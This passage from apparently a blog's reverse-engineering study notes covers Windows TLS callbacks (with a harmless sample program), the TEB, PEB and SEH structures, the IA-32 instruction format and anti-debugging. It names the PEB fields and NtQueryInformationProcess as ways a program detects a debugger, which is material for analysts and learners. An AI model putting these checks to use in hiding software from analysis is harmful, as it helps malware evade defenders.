https://github.com/wine-mirror/wine/blob/master/include/winnt.h<br></code></pre></td></tr></table></figure><p>Notice that the definition of TLS callback function is similar to <strong>DllMain()</strong>:<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">BOOL WINAPI DllMain(<br>  _In_ HINSTANCE hinstDLL,<br>  _In_ DWORD     fdwReason,<br>  _In_ LPVOID    lpvReserved<br>);<br><br>//Source: https://learn.microsoft.com/en-us/windows/win32/dlls/dllmain<br></code></pre></td></tr></table></figure><br>The TLS callback function and DllMain() have the same parameter order.<br>For a callback function, DllHandle is the address of the module (its load address), and Reason indicates why the callback function is being invoked.</p><p>There are four possible values for Reason:<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">/* Argument 1 passed to the DllEntryProc. */<br>#defineDLL_PROCESS_DETACH0/* detach process (unload library) */<br>#defineDLL_PROCESS_ATTACH1/* attach process (load library) */<br>#defineDLL_THREAD_ATTACH2/* attach new thread */<br>#defineDLL_THREAD_DETACH3/* detach thread */<br><br>//Source: https://github.com/wine-mirror/wine/blob/master/include/winnt.h<br></code></pre></td></tr></table></figure></p><h2 id="45-4-Practice-2-TlsTest-exe"><a href="#45-4-Practice-2-TlsTest-exe" class="headerlink" title="45.4 - Practice#2 TlsTest.exe"></a>45.4 - Practice#2 TlsTest.exe</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">#include &lt;windows.h&gt;<br><br>#pragma comment(linker, &quot;/INCLUDE:__tls_used&quot;)<br><br>void print_console(char* szMsg)<br>&#123;<br>    HANDLE hStdout = GetStdHandle(STD_OUTPUT_HANDLE);<br><br>    WriteConsoleA(hStdout, szMsg, strlen(szMsg), NULL, NULL);<br>&#125;<br><br>void NTAPI TLS_CALLBACK1(PVOID DllHandle, DWORD Reason, PVOID Reserved)<br>&#123;<br>    char szMsg[80] = &#123;0,&#125;;<br>    wsprintfA(szMsg, &quot;TLS_CALLBACK1() : DllHandle = %X, Reason = %d\n&quot;, DllHandle, Reason);<br>    print_console(szMsg);<br>&#125;<br><br>void NTAPI TLS_CALLBACK2(PVOID DllHandle, DWORD Reason, PVOID Reserved)<br>&#123;<br>    char szMsg[80] = &#123;0,&#125;;<br>    wsprintfA(szMsg, &quot;TLS_CALLBACK2() : DllHandle = %X, Reason = %d\n&quot;, DllHandle, Reason);<br>    print_console(szMsg);<br>&#125;<br><br>#pragma data_seg(&quot;.CRT$XLX&quot;)<br>    PIMAGE_TLS_CALLBACK pTLS_CALLBACKs[] = &#123; TLS_CALLBACK1, TLS_CALLBACK2, 0 &#125;;<br>#pragma data_seg()<br><br>DWORD WINAPI ThreadProc(LPVOID lParam)<br>&#123;<br>    print_console(&quot;ThreadProc() start\n&quot;);<br><br>    print_console(&quot;ThreadProc() end\n&quot;);<br><br>    return 0;<br>&#125;<br><br>int main(void)<br>&#123;<br>    HANDLE hThread = NULL;<br><br>    print_console(&quot;main() start\n&quot;);<br><br>    hThread = CreateThread(NULL, 0, ThreadProc, NULL, 0, NULL);<br>    WaitForSingleObject(hThread, 60*1000);<br>    CloseHandle(hThread);<br><br>    print_console(&quot;main() end\n&quot;);<br><br>    return 0;<br>&#125;<br></code></pre></td></tr></table></figure><p>The calling order of TLS function:</p><ol><li>DLL_PROCESS_ATTACH</li><li>DLL_THREAD_ATTACH</li><li>DLL_THREAD_DETACH</li><li>DLL_PROCESS_DETACH</li></ol><p align="center" class='item-img' data-src='/images/books/ReverseEngineeringCore/45.7.png'><img src="/images/books/ReverseEngineeringCore/45.7.png" width="700">    <figcaption>    TlsTest.exe    </figcaption></p><h2 id="45-5-Debugging-TLS-Callback-Function"><a href="#45-5-Debugging-TLS-Callback-Function" class="headerlink" title="45.5 - Debugging TLS Callback Function"></a>45.5 - Debugging TLS Callback Function</h2><p>Enable “System breakpoint”:</p><p align="center" class='item-img' data-src='/images/books/ReverseEngineeringCore/45.8.png'><img src="/images/books/ReverseEngineeringCore/45.8.png" width="700">    <figcaption>    Debugging options -> Events -> System breakpoint    </figcaption></p><p align="center" class='item-img' data-src='/images/books/ReverseEngineeringCore/45.9.png'><img src="/images/books/ReverseEngineeringCore/45.9.png" width="700"></p><p>Or using <strong>Olly Advanced</strong>:</p><p align="center" class='item-img' data-src='/images/books/ReverseEngineeringCore/45.10.png'><img src="/images/books/ReverseEngineeringCore/45.10.png" width="500">    <figcaption>    Plugin -> Plly Advanced -> Anti-Debug 2 -> Break on TLS Callback    </figcaption></p><p align="center" class='item-img' data-src='/images/books/ReverseEngineeringCore/45.11.png'><img src="/images/books/ReverseEngineeringCore/45.11.png" width="700"></p><h2 id="45-6-Manually-Add-TLS-Callback-Function"><a href="#45-6-Manually-Add-TLS-Callback-Function" class="headerlink" title="45.6 - Manually Add TLS Callback Function."></a>45.6 - Manually Add TLS Callback Function.</h2><p>Before modification:</p><p align="center" class='item-img' data-src='/images/books/ReverseEngineeringCore/45.12.png'><img src="/images/books/ReverseEngineeringCore/45.12.png" width="700"></p><p>Modification:</p><p align="center" class='item-img' data-src='/images/books/ReverseEngineeringCore/45.12.png'><img src="/images/books/ReverseEngineeringCore/45.12.png" width="700"></p><p align="center" class='item-img' data-src='/images/books/ReverseEngineeringCore/45.13.png'><img src="/images/books/ReverseEngineeringCore/45.13.png" width="700"></p><p align="center" class='item-img' data-src='/images/books/ReverseEngineeringCore/45.14.png'><img src="/images/books/ReverseEngineeringCore/45.14.png" width="700">    <figcaption>    Modifying .rsrc section header.    </figcaption></p><p align="center" class='item-img' data-src='/images/books/ReverseEngineeringCore/45.15.png'><img src="/images/books/ReverseEngineeringCore/45.15.png" width="700">    <figcaption>    HxD: IMAGE_DATA_DIRECTORY    </figcaption></p><p align="center" class='item-img' data-src='/images/books/ReverseEngineeringCore/45.16.png'><img src="/images/books/ReverseEngineeringCore/45.16.png" width="700">    <figcaption>    PEView: IMAGE_DATA_DIRECTORY    </figcaption></p><p>Write the assembly code:</p><p align="center" class='item-img' data-src='/images/books/ReverseEngineeringCore/45.17.png'><img src="/images/books/ReverseEngineeringCore/45.17.png" width="700">    <figcaption>    OllyDbg: Copy to executable -> Selection -> Save file.    </figcaption></p><p align="center" class='item-img' data-src='/images/books/ReverseEngineeringCore/45.18.png'><img src="/images/books/ReverseEngineeringCore/45.18.png" width="700">    <figcaption>    OllyDbg: Save file.    </figcaption></p><p align="center" class='item-img' data-src='/images/books/ReverseEngineeringCore/45.19.png'><img src="/images/books/ReverseEngineeringCore/45.19.png" width="500">    <figcaption>    Testing    </figcaption></p><h1 id="Chapter-46-TEB"><a href="#Chapter-46-TEB" class="headerlink" title="Chapter 46 - TEB"></a>Chapter 46 - TEB</h1><p>TEB stands for <strong>Thread Environment Block</strong>.</p><p>We can view TEB structure using the following command in <strong>WinDbg</strong>:<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&gt; dt _TEB<br></code></pre></td></tr></table></figure></p><p align="center" class='item-img' data-src='/images/books/ReverseEngineeringCore/46.1.png'><img src="/images/books/ReverseEngineeringCore/46.1.png" width="700">    <figcaption>    Members of TEB    </figcaption></p><p>There are two important members:</p><ol><li><strong>+0x030 ProcessEnvironmentBlock: Ptr32 _PEB</strong>\<br>This pointer points to PEB (Introduces in next chapter) .</li><li><strong>NtTib</strong>\<br>TIB stands for <strong>Thread Information Block</strong>, this is the definition of TIB:<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">typedef struct _NT_TIB<br>&#123;<br>     struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList;<br>     PVOID StackBase;<br>     PVOID StackLimit;<br>     PVOID SubSystemTib;<br>     union &#123;<br>         PVOID FiberData;<br>         DWORD Version;<br>     &#125; DUMMYUNIONNAME;<br>     PVOID ArbitraryUserPointer;<br>     struct _NT_TIB *Self;<br>&#125; NT_TIB, *PNT_TIB;<br></code></pre></td></tr></table></figure></li></ol><h2 id="46-2-Accessing-TEB"><a href="#46-2-Accessing-TEB" class="headerlink" title="46.2 - Accessing TEB"></a>46.2 - Accessing TEB</h2><h3 id="Ntdll-NtCurrentTeb"><a href="#Ntdll-NtCurrentTeb" class="headerlink" title="Ntdll.NtCurrentTeb()"></a>Ntdll.NtCurrentTeb()</h3><h3 id="FS-Segment-Register"><a href="#FS-Segment-Register" class="headerlink" title="FS Segment Register"></a>FS Segment Register</h3><p>FS segment register indicates the TEB structure of the current thread.</p><ul><li>FS:[0x18] = start address of TEB<script type="math/tex; mode=display">  \begin{align*}  FS:[0x18] &= TEB.NtTib.Self\\  &= Address of TIB\\  &= Address of TEB FS:0 \\  &= 7FFDF000  \end{align*}</script></li><li>FS:[0X30] = start address of PEB<script type="math/tex; mode=display">  \begin{align*}  FS:[0x30] &= TEB.ProcessEnvironmentBlock\\  &= Address of PEB  \end{align*}</script></li><li>FS:[0] = start address of SEH<script type="math/tex; mode=display">  \begin{align*}  FS:[0] &= TEB.NtTib.ExceptionList\\  &= Address of SEH  \end{align*}</script></li></ul><h1 id="Chapter-47-PEB"><a href="#Chapter-47-PEB" class="headerlink" title="Chapter 47 - PEB"></a>Chapter 47 - PEB</h1><h2 id="47-1-PEB"><a href="#47-1-PEB" class="headerlink" title="47.1 - PEB"></a>47.1 - PEB</h2><h3 id="Accessing-PEB"><a href="#Accessing-PEB" class="headerlink" title="Accessing PEB"></a>Accessing PEB</h3><p>PEB stands for <strong>Process Environment Block</strong>.<br>PEB structure stores information of process.</p><p>We execute the following instruction in OllyDby (F7 or F8) at EP:<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">MOV EAX,DWORD PTR FS:[0x30]<br></code></pre></td></tr></table></figure></p><p align="center" class='item-img' data-src='/images/books/ReverseEngineeringCore/47.1.png'><img src="/images/books/ReverseEngineeringCore/47.1.png" width="700">    <figcaption>    EAX    </figcaption></p><h3 id="Definition-of-PEB"><a href="#Definition-of-PEB" class="headerlink" title="Definition of PEB"></a>Definition of PEB</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">typedef struct _PEB &#123;<br>  BYTE                          Reserved1[2];<br>  BYTE                          BeingDebugged;<br>  BYTE                          Reserved2[1];<br>  PVOID                         Reserved3[2];<br>  PPEB_LDR_DATA                 Ldr;<br>  PRTL_USER_PROCESS_PARAMETERS  ProcessParameters;<br>  PVOID                         Reserved4[3];<br>  PVOID                         AtlThunkSListPtr;<br>  PVOID                         Reserved5;<br>  ULONG                         Reserved6;<br>  PVOID                         Reserved7;<br>  ULONG                         Reserved8;<br>  ULONG                         AtlThunkSListPtr32;<br>  PVOID                         Reserved9[45];<br>  BYTE                          Reserved10[96];<br>  PPS_POST_PROCESS_INIT_ROUTINE PostProcessInitRoutine;<br>  BYTE                          Reserved11[128];<br>  PVOID                         Reserved12[1];<br>  ULONG                         SessionId;<br>&#125; PEB, *PPEB;<br></code></pre></td></tr></table></figure><h3 id="Members-of-PEB"><a href="#Members-of-PEB" class="headerlink" title="Members of PEB"></a>Members of PEB</h3><p><strong>Windows 10</strong></p><p align="center" class='item-img' data-src='/images/books/ReverseEngineeringCore/47.2.png'><img src="/images/books/ReverseEngineeringCore/47.2.png" width="700">    <figcaption>    EAX    </figcaption></p><h2 id="47-2-Important-Members"><a href="#47-2-Important-Members" class="headerlink" title="47.2 - Important Members"></a>47.2 - Important Members</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">+002 BeginDebugged : UChar<br>+008 ImageBaseAddress : Ptr32 Void<br>+00c Ldr : Ptr32 _PEB_LDR_DATA<br>+018 ProcessHeap : Ptr32 Void<br>+068 NtGlobalFlag : Uint4B<br></code></pre></td></tr></table></figure><ol><li>PEB.BeginDebugged:\<br>This value is commonly used in anti-debugging.</li><li>PEB.ImageBaseAddress:\<br>This value indicates the <strong>ImageBase</strong> of the process. We use <strong>GetModuleHandle()</strong> to obtain ImageBase.</li><li>PEB.Ldr:\<br>This member is a pointer that points to <strong>_PEB_LDR_DATA</strong> structure. After a DLL has been loaded into a process, we can obtain the ImageBase of the module through <code>PEB.Ldr</code>.</li><li>PEB.ProcessHeap &amp; PEB.NtGlobalFlag:\<br>These two values are commonly used in anti-debugging.</li></ol><h1 id="Chapter-48-SEH"><a href="#Chapter-48-SEH" class="headerlink" title="Chapter 48 - SEH"></a>Chapter 48 - SEH</h1><h2 id="48-1-SEH"><a href="#48-1-SEH" class="headerlink" title="48.1 - SEH"></a>48.1 - SEH</h2><p>SEH stands for <strong>Structured Exception Handling</strong>.</p><p>SEH is the exception handling mechanism used in Windows. In practice, we use keywords such as <code>__try</code>, <code>__except</code>, <code>__finally</code> to implement exception handling. Additionally, this mechanism is widely used in anti-debugging techniques.</p><p>Notice that the structure of SEH is different from the <code>try</code> / <code>catch</code> mechanism in C++. Windows introduced the SEH mechanism first, and it was later integrated into Visual C++. In other words, SEH is a low-level exception handling mechanism supported by the Windows operating system and the Visual C++ compiler.</p><p align="center" class='item-img' data-src='/images/books/ReverseEngineeringCore/48.1.png'><img src="/images/books/ReverseEngineeringCore/48.1.png" width="700">    <figcaption>    Exception.    </figcaption></p><p align="center" class='item-img' data-src='/images/books/ReverseEngineeringCore/48.2.png'><img src="/images/books/ReverseEngineeringCore/48.2.png" width="700">    <figcaption>    Memory: Address 0 is undefined.    </figcaption></p><h2 id="48-4-Exception"><a href="#48-4-Exception" class="headerlink" title="48.4 - Exception"></a>48.4 - Exception</h2><p>There are 5 types of common exceptions:</p><ol><li><strong>EXCEPTION_ACCESS_VIOLATION(C0000005)</strong></li><li><strong>EXCEPTION_BREAKPOINT(80000003)</strong></li><li><strong>EXCEPTION_ILLEGAL_INSTRUCTION(C000001D)</strong></li><li><strong>EXCEPTION_INT_DIVIDE_BY_ZERO(C0000094)</strong></li><li><strong>EXCEPTION_SINGLE_STEP(80000004)</strong></li></ol><h2 id="48-5-Details-of-SEH"><a href="#48-5-Details-of-SEH" class="headerlink" title="48.5 - Details of SEH"></a>48.5 - Details of SEH</h2><h3 id="SEH-Chain"><a href="#SEH-Chain" class="headerlink" title="SEH Chain"></a>SEH Chain</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">typedef struct _EXCEPTION_REGISTRATION_RECORD<br>&#123;<br>     PEXCEPTION_REGISTRATION_RECORD Next;<br>     PEXCEPTION_DISPOSITION Handler;<br>&#125; EXCEPTION_REGISTRATION_RECORD, *PEXCEPTION_REGISTRATION_RECORD;<br><br>//Source: https://maple19out.tistory.com/72<br></code></pre></td></tr></table></figure><p align="center" class='item-img' data-src='/images/books/ReverseEngineeringCore/48.3.png'><img src="/images/books/ReverseEngineeringCore/48.3.png" width="700" alt="SEH Chain">    <figcaption>    Source: https://maple19out.tistory.com/72    </figcaption></p><h3 id="Definition-of-Exception-Handler"><a href="#Definition-of-Exception-Handler" class="headerlink" title="Definition of Exception Handler"></a>Definition of Exception Handler</h3><h3 id="TEB-NtTib-ExceptionList"><a href="#TEB-NtTib-ExceptionList" class="headerlink" title="TEB.NtTib.ExceptionList"></a>TEB.NtTib.ExceptionList</h3><h3 id="Using-SEH"><a href="#Using-SEH" class="headerlink" title="Using SEH"></a>Using SEH</h3><h2 id="48-6-Practice-2-seh-exe"><a href="#48-6-Practice-2-seh-exe" class="headerlink" title="48.6 - Practice#2 - seh.exe"></a>48.6 - Practice#2 - seh.exe</h2><h1 id="Chapter-49-IA-32-Instruction"><a href="#Chapter-49-IA-32-Instruction" class="headerlink" title="Chapter 49 - IA-32 Instruction"></a>Chapter 49 - IA-32 Instruction</h1><h2 id="49-2-Terminology"><a href="#49-2-Terminology" class="headerlink" title="49.2 - Terminology"></a>49.2 - Terminology</h2><div class="table-container"><table><thead><tr><th>Terminology</th><th>Description</th></tr></thead><tbody><tr><td>Machine Language</td></tr><tr><td>Instruction</td></tr><tr><td>OpCode</td></tr><tr><td>Assembly</td></tr><tr><td>Assemble</td></tr><tr><td>Assembler</td></tr><tr><td>Disassemble</td></tr><tr><td>Disassembler</td></tr><tr><td>Disassembly</td></tr><tr><td>*Compile</td></tr><tr><td>*Link</td></tr></tbody></table></div><h2 id="49-3-IA-32-Instruction-Format"><a href="#49-3-IA-32-Instruction-Format" class="headerlink" title="49.3 - IA-32 Instruction Format"></a>49.3 - IA-32 Instruction Format</h2><p align="center" class='item-img' data-src='/images/books/ReverseEngineeringCore/49.1.png'><img src="/images/books/ReverseEngineeringCore/49.1.png" width="700" alt="IA-32 Format">    <figcaption>    Source: https://www.researchgate.net/figure/A-32-general-instruction-format_fig1_265265229    </figcaption></p><h3 id="Instruction-Prefix"><a href="#Instruction-Prefix" class="headerlink" title="Instruction Prefix"></a>Instruction Prefix</h3><h3 id="Opcode"><a href="#Opcode" class="headerlink" title="Opcode"></a>Opcode</h3><h3 id="ModR-M"><a href="#ModR-M" class="headerlink" title="ModR/M"></a>ModR/M</h3><h3 id="SIB"><a href="#SIB" class="headerlink" title="SIB"></a>SIB</h3><p>SIB (Scale-Index-Base) is also an optional field.</p><h3 id="Deplacement"><a href="#Deplacement" class="headerlink" title="Deplacement"></a>Deplacement</h3><h3 id="Immediate"><a href="#Immediate" class="headerlink" title="Immediate"></a>Immediate</h3><h2 id="49-4-Instruction-Analyzing"><a href="#49-4-Instruction-Analyzing" class="headerlink" title="49.4 - Instruction Analyzing"></a>49.4 - Instruction Analyzing</h2><h2 id="49-5-Practice"><a href="#49-5-Practice" class="headerlink" title="49.5 - Practice"></a>49.5 - Practice</h2><h1 id="Chapter-50-Anti-Debugging"><a href="#Chapter-50-Anti-Debugging" class="headerlink" title="Chapter 50 - Anti-Debugging"></a>Chapter 50 - Anti-Debugging</h1><h2 id="50-1-Anti-Debugging"><a href="#50-1-Anti-Debugging" class="headerlink" title="50.1 Anti-Debugging"></a>50.1 Anti-Debugging</h2><p>Anti-Debugging techniques are strongly dependent to OS and debugger.</p><h2 id="50-2-Anti-Anti-Debugging"><a href="#50-2-Anti-Anti-Debugging" class="headerlink" title="50.2 - Anti-Anti-Debugging"></a>50.2 - Anti-Anti-Debugging</h2><h2 id="50-3-Types-of-Anti-Debugging"><a href="#50-3-Types-of-Anti-Debugging" class="headerlink" title="50.3 - Types of Anti-Debugging"></a>50.3 - Types of Anti-Debugging</h2><h3 id="Static-Anti-Debugging"><a href="#Static-Anti-Debugging" class="headerlink" title="Static Anti-Debugging"></a>Static Anti-Debugging</h3><p><strong>Static anti-debugging</strong> is used to detect a debugger. If a debugger is detected, the process cannot execute normally. Once the static anti-debugging technique is cracked, the program can execute normally.</p><h3 id="Dynamic-Anti-Debugging"><a href="#Dynamic-Anti-Debugging" class="headerlink" title="Dynamic Anti-Debugging"></a>Dynamic Anti-Debugging</h3><p>Even though we have cracked the static anti-debugging technique, we may still encounter difficulties. If a dynamic anti-debugging technique is applied, it becomes difficult to trace instructions because this technique interferes with the debugger.</p><h1 id="Chapter-51-Static-Anti-Debugging-Techniques"><a href="#Chapter-51-Static-Anti-Debugging-Techniques" class="headerlink" title="Chapter 51 - Static Anti-Debugging Techniques"></a>Chapter 51 - Static Anti-Debugging Techniques</h1><h2 id="51-2-PEB"><a href="#51-2-PEB" class="headerlink" title="51.2 - PEB"></a>51.2 - PEB</h2><p>PEB is used for detecting a debugger. It provides reliable and convenient information. This technique is commonly used in anti-debugging.</p><h3 id="BeingDebugged-0x2"><a href="#BeingDebugged-0x2" class="headerlink" title="BeingDebugged (+0x2)"></a>BeingDebugged (+0x2)</h3><h3 id="Ldr-0xC"><a href="#Ldr-0xC" class="headerlink" title="Ldr (+0xC)"></a>Ldr (+0xC)</h3><h3 id="Process-Heap-0x18"><a href="#Process-Heap-0x18" class="headerlink" title="Process Heap (+0x18)"></a>Process Heap (+0x18)</h3><ul><li>GetPocessHeap()</li><li>Flags (+0xC) &amp; Force Flags (+0x10)</li></ul><h3 id="NtGlobalFlag-0x68"><a href="#NtGlobalFlag-0x68" class="headerlink" title="NtGlobalFlag (+0x68)"></a>NtGlobalFlag (+0x68)</h3><h2 id="51-3-NtQueryInformationProcess"><a href="#51-3-NtQueryInformationProcess" class="headerlink" title="51.3 - NtQueryInformationProcess()"></a>51.3 - NtQueryInformationProcess()</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">__kernel_entry NTSTATUS NtQueryInformationProcess(<br>  [in]            HANDLE           ProcessHandle,<br>  [in]            PROCESSINFOCLASS ProcessInformationClass,<br>  [out]           PVOID            ProcessInformation,<br>  [in]            ULONG            ProcessInformationLength,<br>  [out, optional] PULONG           ReturnLength<br>);<br><br>//Source: https://learn.microsoft.com/en-us/windows/win32/api/winternl/nf-winternl-ntqueryinformationprocess<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">typedef enum _PROCESSINFOCLASS<br>&#123;<br>    ProcessBasicInformation,                        // q: PROCESS_BASIC_INFORMATION, PROCESS_EXTENDED_BASIC_INFORMATION<br>    ProcessQuotaLimits,                             // qs: QUOTA_LIMITS, QUOTA_LIMITS_EX<br>    ProcessIoCounters,                              // q: IO_COUNTERS<br>    ProcessVmCounters,                              // q: VM_COUNTERS, VM_COUNTERS_EX, VM_COUNTERS_EX2<br>    ProcessTimes,                                   // q: KERNEL_USER_TIMES<br>    ProcessBasePriority,                            // s: KPRIORITY<br>    ProcessRaisePriority,                           // s: ULONG<br>    ProcessDebugPort,                               // q: HANDLE<br>    ProcessExceptionPort,                           // s: PROCESS_EXCEPTION_PORT (requires SeTcbPrivilege)<br>    ProcessAccessToken,                             // s: PROCESS_ACCESS_TOKEN<br>    ProcessLdtInformation,                          // qs: PROCESS_LDT_INFORMATION // 10<br>    ProcessLdtSize,                                 // s: PROCESS_LDT_SIZE<br>    ProcessDefaultHardErrorMode,                    // qs: ULONG<br>    ProcessIoPortHandlers,                          // s: PROCESS_IO_PORT_HANDLER_INFORMATION // (kernel-mode only)<br>    ProcessPooledUsageAndLimits,                    // q: POOLED_USAGE_AND_LIMITS<br>    ProcessWorkingSetWatch,                         // q: PROCESS_WS_WATCH_INFORMATION[]; s: void<br>    ProcessUserModeIOPL,                            // qs: ULONG (requires SeTcbPrivilege)<br>    ProcessEnableAlignmentFaultFixup,               // s: BOOLEAN<br>    ProcessPriorityClass,                           // qs: PROCESS_PRIORITY_CLASS<br>    ProcessWx86Information,                         // qs: ULONG (requires SeTcbPrivilege) (VdmAllowed)<br>    ProcessHandleCount,                             // q: ULONG, PROCESS_HANDLE_INFORMATION // 20<br>    ProcessAffinityMask,                            // qs: KAFFINITY, qs: GROUP_AFFINITY<br>    ProcessPriorityBoost,                           // qs: ULONG<br>    ProcessDeviceMap,                               // qs: PROCESS_DEVICEMAP_INFORMATION, PROCESS_DEVICEMAP_INFORMATION_EX<br>    ProcessSessionInformation,                      // q: PROCESS_SESSION_INFORMATION<br>    ProcessForegroundInformation,                   // s: PROCESS_FOREGROUND_BACKGROUND<br>    ProcessWow64Information,                        // q: ULONG_PTR<br>    ProcessImageFileName,                           // q: UNICODE_STRING<br>    ProcessLUIDDeviceMapsEnabled,                   // q: ULONG<br>    ProcessBreakOnTermination,                      // qs: ULONG<br>    ProcessDebugObjectHandle,                       // q: HANDLE // 30<br>    ProcessDebugFlags,                              // qs: ULONG<br>    ProcessHandleTracing,                           // q: PROCESS_HANDLE_TRACING_QUERY; s: PROCESS_HANDLE_TRACING_ENABLE[_EX] or void to disable<br>    ProcessIoPriority,                              // qs: IO_PRIORITY_HINT<br>    ProcessExecuteFlags,                            // qs: ULONG (MEM_EXECUTE_OPTION_*)<br>    ProcessTlsInformation,                          // qs: PROCESS_TLS_INFORMATION // ProcessResourceManagement<br>    ProcessCookie,                                  // q: ULONG<br>    ProcessImageInformation,                        // q: SECTION_IMAGE_INFORMATION<br>    ProcessCycleTime,                               // q: PROCESS_CYCLE_TIME_INFORMATION // since VISTA<br>    ProcessPagePriority,                            // qs: PAGE_PRIORITY_INFORMATION<br>    ProcessInstrumentationCallback,                 // s: PVOID or 